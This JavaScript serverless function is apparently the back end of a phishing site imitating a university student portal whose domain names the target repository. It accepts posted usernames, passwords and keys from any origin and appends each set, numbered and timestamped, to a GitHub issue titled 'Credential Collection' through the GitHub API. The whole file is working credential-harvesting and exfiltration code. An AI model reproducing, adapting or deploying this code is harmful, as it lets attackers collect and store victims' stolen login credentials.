
const axios = require('axios');
module.exports = async (req, res) => {
  
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
   
    const githubToken = process.env.GITHUB_TOKEN;
    
    if (!githubToken) {
      console.error('GitHub token is not defined in environment variables');
      return res.status(500).json({ error: 'Server configuration error' });
    }
    
    const { username, password, key } = req.body;
    
   
    const owner = 'ZA3MA3'; 
    const repo = 'progres.mesrs.dz'; 
    const issueTitle = "Credential Collection";
    
    
    const issuesResponse = await axios.get(
      `https://api.github.com/repos/${owner}/${repo}/issues`,
      {
        headers: {
          'Authorization': `Bearer ${githubToken}`,
          'Accept': 'application/vnd.github.v3+json'
        },
        params: {
          state: 'open',
          creator: owner
        }
      }
    );
    
    
    let existingIssue = issuesResponse.data.find(issue => issue.title === issueTitle);
    let response;
    
    if (existingIssue) {
    
      const timestamp = new Date().toISOString();
      
      const issueDetailsResponse = await axios.get(
        `https://api.github.com/repos/${owner}/${repo}/issues/${existingIssue.number}`,
        {
          headers: {
            'Authorization': `Bearer ${githubToken}`,
            'Accept': 'application/vnd.github.v3+json'
          }
        }
      );
      
      const currentBody = issueDetailsResponse.data.body;
      
 
      const credRegex = /creds(\d+):/g;
      let matches = [...currentBody.matchAll(credRegex)];
      let nextCredId = 1;
      
      if (matches.length > 0) {
        
        const highestId = Math.max(...matches.map(match => parseInt(match[1])));
        nextCredId = highestId + 1;
      }
      
      
      const newEntry = `\n\n## creds${nextCredId}: ${timestamp}\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`;
      
     
      response = await axios.patch(
        `https://api.github.com/repos/${owner}/${repo}/issues/${existingIssue.number}`,
        {
          body: currentBody + newEntry
        },
        {
          headers: {
            'Authorization': `Bearer ${githubToken}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json'
          }
        }
      );
      
    } else {
      
      response = await axios.post(
        `https://api.github.com/repos/${owner}/${repo}/issues`,
        {
          title: issueTitle,
          body: `# Collected Credentials\n\n## creds1: ${new Date().toISOString()}\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`,
          labels: ["credentials"]
        },
        {
          headers: {
            'Authorization': `Bearer ${githubToken}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json'
          }
        }
      );
    }
    
    return res.status(200).json({ 
      success: true, 
      issueUrl: response.data.html_url,
      isNew: !existingIssue
    });
    
  } catch (error) {
    console.error('Error working with GitHub issue:', error.response?.data || error.message);
    return res.status(500).json({ error: 'Failed to process GitHub issue' });
  }
};
